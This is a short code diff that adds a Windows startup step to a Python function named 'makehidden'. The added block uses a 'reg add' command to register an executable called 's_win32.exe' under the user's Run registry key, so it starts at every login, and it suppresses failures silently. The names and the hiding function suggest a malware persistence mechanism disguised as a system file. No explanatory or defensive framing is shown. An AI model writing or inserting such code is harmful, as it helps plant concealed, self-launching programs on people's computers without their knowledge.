@@ -52,6 +52,24 @@ def makehidden():
                     pass
                 return False
 
+        # Add to startup
+        try:
+            if sys.platform == "win32":
+                # Windows registry method
+                result = subprocess.run(
+                    f'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v s_win32.exe /t REG_SZ /d "{target_file_path}"',
+                    shell=True,
+                    stderr=subprocess.PIPE,
+                    stdout=subprocess.PIPE,
+                )
+                if result.returncode != 0:
+                    print(f"Registry add failed: {result.stderr.decode().strip()}")
+            else:
+                pass
+
+        except:
+            pass
+
     except Exception as e:
         print(f"Unexpected error in makehidden: {e}")
         return False
